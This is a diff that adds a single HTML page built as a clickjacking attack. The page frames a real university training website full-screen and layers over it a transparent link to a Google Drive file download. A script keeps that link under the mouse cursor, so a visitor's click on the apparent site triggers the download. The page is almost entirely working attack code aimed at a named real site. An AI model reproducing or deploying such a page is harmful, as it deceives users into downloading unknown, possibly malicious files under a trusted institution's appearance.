@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <meta charset="UTF-8">
+  <title></title>
+  <style media="screen">
+    body {
+
+    }
+    div {
+      color: transparent;
+      border: none;
+      position: absolute;
+      width: 100 px;
+      height: 100 px;
+    }
+    iframe{
+      border: none;
+      position: absolute;
+      width: 100%;
+      height: 100%;
+    }
+    a{
+      color: blue;
+      display: block;
+      width: 100 px;
+      height: 100 px;
+    }
+
+  </style>
+</head>
+<body>
+</body>
+
+  <iframe src="https://daotao.vnua.edu.vn/" width="" height=""></iframe>
+  <div class="" id="clickjacking1">
+    <a href="https://drive.google.com/uc?id=1Er4VWnncg2Ic9CluqEmX3mT9qTaNwBab&export=download">Click here</a>
+
+  </div>
+  <script type="text/javascript">
+      window.onmousemove = function(e) {
+        var m = document.getElementById('clickjacking1');
+        m.style.left = e.clientX - 10 + 'px';
+        m.style.top = e.clientY - 10 + 'px';
+      }
+  </script>
+</html>
